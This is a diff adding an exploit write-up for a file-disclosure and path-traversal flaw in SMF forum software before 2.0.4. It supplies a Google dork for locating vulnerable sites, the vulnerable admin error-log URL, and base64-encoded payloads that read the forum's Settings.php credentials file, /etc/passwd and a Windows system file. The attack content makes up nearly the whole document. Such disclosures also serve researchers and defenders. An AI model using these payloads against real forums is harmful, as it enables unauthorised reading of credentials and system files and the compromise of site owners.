@@ -1,0 +1,43 @@
+# Exploit Title: SMF < 2.0.4 File Disclosure/Path Traversal
+# Google Dork: "Powered by SMF 2.0.x"
+# Date: 02/02/2013
+# Exploit Author: NightlyDev
+# Software Link: http://download.simplemachines.org/index.php?thanks;filename=smf_2-0-3_install.zip
+# Version: 2.0.x < 2.0.4
+# Tested on: CentOS 6.2
+
+ _   _ _       _     _   _        _____          _               
+| \ | (_)     | |   | | | |      / ____|        | |              
+|  \| |_  __ _| |__ | |_| |_   _| |     ___   __| | ___ _ __ ___ 
+| . ` | |/ _` | '_ \| __| | | | | |    / _ \ / _` |/ _ \ '__/ __|
+| |\  | | (_| | | | | |_| | |_| | |___| (_) | (_| |  __/ |  \__ \
+|_| \_|_|\__, |_| |_|\__|_|\__, |\_____\___/ \__,_|\___|_|  |___/
+          __/ |             __/ |                                
+         |___/             |___/                                 
+		 
+
+You need the "admin_forum" privilege for this exploit.
+
+http://<server>/index.php?action=admin;area=logs;sa=errorlog;file=[BASE64 ENCODED FILE PATH];line=[LINE NUMBER]
+
+Example :
+
+/srv/www/smf/Settings.php : L3Nydi93d3cvc21mL1NldHRpbmdzLnBocA= 
+
+/etc/passwd : L2V0Yy9wYXNzd2Q=
+
+
+SMF Configuration File Disclosure : 
+
+file=L3Nydi93d3cvc21mL1NldHRpbmdzLnBocA=;line=40
+
+/etc/passwd File : 
+
+file=L2V0Yy9wYXNzd2Q=;line=1
+
+C:\Windows\system.ini
+
+file=QzpcV2luZG93c1xzeXN0ZW0uaW5p;line=1
+
+
+NightlyDev.
